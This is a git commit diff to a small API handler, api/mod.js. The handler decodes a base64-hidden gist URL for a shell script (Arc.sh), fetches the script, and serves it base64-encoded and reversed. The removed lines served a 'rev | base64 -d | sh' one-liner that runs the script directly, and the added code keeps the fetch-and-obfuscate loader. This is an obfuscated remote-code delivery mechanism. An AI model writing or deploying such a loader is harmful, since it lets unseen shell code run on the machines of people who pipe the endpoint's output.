fe9f611c47d88c6e5d43a7961d162dc40381ccea
VannXD0 <holilmustofa5@gmail.com>
2026-06-25 13:52:48 +0700

    Update mod.js

--- api/mod.js
+++ api/mod.js
@@ -1,15 +1,12 @@
 export default async function handler(req, res) {
-  const _U = Buffer.from("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9WYW5uWEQwL2U3YmEzNGYxZDY0MWQ0MGYyMDlmYzBiZjg5OWJjNjZmL3Jhdy9hNjIzNzk5ZjkwZGU5MTIwZDkwNGNiNWNlNmYwZGNhOWVmMDkwOTM0L0FyYy5zaA==", 'base64').toString('utf8');
-
+  const _G = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9WYW5uWEQwL2U3YmEzNGYxZDY0MWQ0MGYyMDlmYzBiZjg5OWJjNjZmL3Jhdy9hNjIzNzk5ZjkwZGU5MTIwZDkwNGNiNWNlNmYwZGNhOWVmMDkwOTM0L0FyYy5zaA==";
+  const _U = Buffer.from(_G, 'base64').toString('utf8');
   try {
     const _R = await fetch(_U);
     const _S = await _R.text();
-    
     const _O = Buffer.from(_S).toString('base64').split('').reverse().join('');
-    
-    res.setHeader("Content-Type", "text/plain");
-    return res.status(200).send(`echo "${_O}" | rev | base64 -d | sh`);
-  } catch (e)  
-    return res.status(500).send("echo 'Access Denied'");
+    res.status(200).send(_O);
+  } catch (e) {
+    res.status(500).send("");
   }
 }
